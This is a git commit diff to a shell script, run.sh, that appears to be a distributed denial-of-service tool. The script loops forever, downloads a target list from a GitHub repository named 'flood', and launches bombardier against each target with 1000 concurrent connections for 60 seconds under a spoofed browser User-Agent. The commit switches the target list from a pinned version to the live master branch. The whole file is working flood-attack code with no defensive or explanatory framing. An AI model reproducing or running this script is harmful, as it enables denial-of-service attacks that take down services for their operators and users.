93276c13f9f87acc9396f85746c7dafd2e79c93b
Anton Klyba <antonklyba@pingidentity.com>
2022-02-27 12:19:50 +0200

    fix

--- run.sh
+++ run.sh
@@ -2,7 +2,7 @@
 
 while true
 do
-    wget -O /app/targets.txt https://github.com/Anarhyst266/flood/blob/168c2598a51324ae61b50682858b3e9a4f6ff888/targets.txt 
+    wget -O /app/targets.txt https://github.com/Anarhyst266/flood/blob/master/targets.txt
     cat /app/targets.txt | while read line
     do
         bombardier -c 1000 -d 60s -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36" -q ${line} &
